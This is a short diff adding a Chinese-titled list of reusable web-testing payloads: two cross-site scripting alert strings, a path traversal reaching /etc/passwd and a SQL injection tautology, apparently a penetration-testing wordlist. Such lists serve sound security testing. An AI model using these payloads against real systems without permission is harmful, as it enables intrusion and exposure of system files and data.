@@ -1,0 +1,6 @@
+# 可多项目复用的Payload
+<svg/onload=alert(1)>
+<script>alert(1)</script>
+../../../../etc/passwd
+" OR 1=1 --
+…（自定义补充）
